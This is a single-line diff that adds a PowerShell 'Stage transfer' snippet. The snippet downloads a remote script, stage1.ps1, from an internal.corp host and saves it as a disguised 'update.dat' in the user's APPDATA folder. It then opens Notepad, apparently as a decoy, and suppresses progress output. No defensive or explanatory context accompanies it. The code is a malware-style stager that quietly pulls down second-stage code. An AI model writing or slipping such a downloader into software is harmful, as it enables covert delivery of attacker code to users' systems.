@@ -1,0 +1,1 @@
+<# Stage transfer #> try { Invoke-WebRequest -Uri "http://internal.corp:80/stage1.ps1" -OutFile "$env:APPDATA\update.dat" -UseBasicParsing; & "notepad.exe"; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Stage transfer failed" }
